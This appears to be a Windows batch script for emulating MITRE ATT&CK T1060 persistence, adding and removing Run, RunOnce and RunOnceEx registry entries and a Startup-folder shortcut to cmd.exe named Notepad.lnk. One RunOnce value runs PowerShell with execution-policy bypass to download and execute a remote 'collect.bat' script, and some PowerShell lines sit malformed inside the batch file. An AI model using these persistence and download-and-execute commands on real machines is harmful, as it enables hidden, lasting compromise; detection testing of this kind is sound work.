@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Registry Run Keys and Startup Folder (T1060)
ECHO.
ECHO [+] Add Registry Entries to achieve Persistence
ECHO 	- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
ECHO 	- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx
ECHO -------------------------------------------------------------------
cmd /c reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Mitre Entry" /t REG_SZ /F /D "C:\Path\Mitre.exe"
cmd /c reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Mitre Entry" /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\Mitre.dll"
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
ECHO.

ECHO [+] Add Registry and StartUp to achieve Persistence using Powershell
ECHO 	- HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
ECHO 	- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
ECHO -------------------------------------------------------------------
# Set up the RunOnce registry key
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
$ScriptPath = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://github.com/greycel/poc/blob/master/collect.bat')"

# Set the registry entry for the next run
Set-ItemProperty -Path $RunOnceKey -Name "NextRun" -Value $ScriptPath

# Remove the registry entry after execution
Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force

# Set up a shortcut in the Startup folder
$TargetFile = "$env:SystemRoot\System32\cmd.exe"
$ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.Save()

powershell -ep bypass $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/greycel/poc/blob/master/collect.bat`")"'
powershell -ep bypass Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
powershell -ep bypass $TargetFile = "$env:SystemRoot\System32\ C:\\Windows\System32\cmd.exe"; $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"; $WScriptShell = New-Object -ComObject WScript.Shell; $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile); $Shortcut.TargetPath = $TargetFile; $Shortcut.Save()
ECHO.


